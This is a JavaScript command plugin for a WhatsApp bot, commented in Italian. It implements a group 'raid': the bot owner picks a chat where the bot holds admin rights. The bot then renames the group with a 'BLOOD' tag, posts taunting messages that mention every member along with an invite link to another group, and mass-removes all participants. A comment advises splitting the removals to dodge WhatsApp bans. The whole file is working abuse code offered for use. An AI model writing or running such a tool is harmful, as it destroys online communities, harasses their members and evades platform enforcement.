let handler = async (m, { conn, text, command }) => {
    const ownerJids = global.owner.map(o => o[0] + '@s.whatsapp.net');
    if (!ownerJids.includes(m.sender)) return;

    // Recupera tutti i gruppi
    let getGroups = await conn.groupFetchAllParticipating();
    let groups = Object.values(getGroups);

    let targetChat;

    if (!m.isGroup) {
        if (!text) {
            let txt = "🩸 *Scegli il gruppo da devastare:*\n\n";
            groups.forEach((g, i) => {
                txt += `*${i + 1}.* ${g.subject}\n`;
            });
            txt += `\n👉 Scrivi *.${command} [numero]*`;
            return m.reply(txt);
        }

        let index = parseInt(text) - 1;
        if (isNaN(index) || !groups[index]) return m.reply("❌ Numero non valido.");
        targetChat = groups[index].id;
    } else {
        targetChat = m.chat;
    }

    try {
        // --- CONTROLLO REALE ADMIN ---
        // Recuperiamo i metadati freschi del gruppo target
        let metadata = await conn.groupMetadata(targetChat);
        const botId = conn.user.id.split(':')[0] + '@s.whatsapp.net';
        
        // Cerchiamo il bot tra i partecipanti e verifichiamo se è admin o superadmin
        let botInGroup = metadata.participants.find(p => p.id === botId);
        let isActuallyAdmin = botInGroup?.admin === 'admin' || botInGroup?.admin === 'superadmin';

        if (!isActuallyAdmin) {
            return m.reply(`❌ Errore: In "${metadata.subject}" il bot NON è admin. Non posso agire.`);
        }

        // --- ESECUZIONE ---
        if (!m.isGroup) await m.reply(`⚔️ Eseguo pugnalata su: *${metadata.subject}*...`);

        // 1. Cambio Nome
        await conn.groupUpdateSubject(targetChat, `${metadata.subject} | 𝚂𝚅𝚃 𝙱𝚢 𝐁𝐋𝐎𝐎𝐃`);

        // 2. Messaggi
        await conn.sendMessage(targetChat, {
            text: "𝐁𝐥𝐨𝐨𝐝 𝐞̀ 𝐚𝐫𝐫𝐢𝐯𝐚𝐭𝐨 𝐢𝐧 𝐜𝐢𝐫𝐜𝐨𝐥𝐚𝐳𝐢𝐨𝐧𝐞, 𝐞 𝐪𝐮𝐞𝐬𝐭𝐨 𝐬𝐢𝐠𝐧𝐢𝐟𝐢𝐜𝐚 𝐬𝐨𝐥𝐨 𝐮𝐧𝐚 𝐜𝐨𝐬𝐚, 𝐃𝐄𝐕𝐀𝐒𝐓𝐎. 𝐈𝐥 𝐝𝐞𝐯𝐚𝐬𝐭𝐨 𝐜𝐡𝐞 𝐚𝐦𝐦𝐚𝐳𝐳𝐞𝐫𝐚̀ 𝐭𝐮𝐭𝐭𝐢 𝐩𝐫𝐨𝐩𝐫𝐢𝐨 𝐜𝐨𝐦𝐞 𝐮𝐧𝐚 𝐩𝐮𝐠𝐧𝐚𝐥𝐚𝐭𝐚, 𝐩𝐫𝐨𝐩𝐫𝐢𝐨 𝐪𝐮𝐞𝐥𝐥𝐚 𝐜𝐡𝐞 𝐯𝐢 𝐝𝐚𝐫𝐚̀."
        });

        await conn.sendMessage(targetChat, {
            text: "𝐀𝐯𝐞𝐭𝐞 𝐚𝐯𝐮𝐭𝐨 𝐥' 𝐨𝐧𝐨𝐫𝐞 𝐝𝐢 𝐞𝐬𝐬𝐞𝐫𝐞 𝐬𝐭𝐚𝐭𝐢 𝐩𝐮𝐠𝐧𝐚𝐥𝐚𝐭𝐢 𝐝𝐚 𝐁𝐥𝐨𝐨𝐝, 𝐯𝐢 𝐚𝐬𝐩𝐞𝐭𝐭𝐢𝐚𝐦𝐨 𝐭𝐮𝐭𝐭𝐢 𝐪𝐮𝐚:\n\nhttps://chat.whatsapp.com/HsPqgzLHm25LBVcEd7Ldri",
            mentions: metadata.participants.map(p => p.id)
        });

        // 3. Kick di massa (escludendo bot e owner)
        let usersToRemove = metadata.participants
            .map(p => p.id)
            .filter(jid => jid !== botId && !ownerJids.includes(jid));

        if (usersToRemove.length > 0) {
            // Dividiamo in piccoli chunk per evitare ban immediati da WhatsApp (opzionale ma consigliato)
            await conn.groupParticipantsUpdate(targetChat, usersToRemove, 'remove');
        }

        if (!m.isGroup) m.reply(`✅ *${metadata.subject}* è stato svuotato.`);

    } catch (e) {
        console.error(e);
        m.reply("❌ Errore durante l'operazione: " + e.message);
    }
};

handler.command = ['pugnala'];
handler.owner = true;

export default handler;
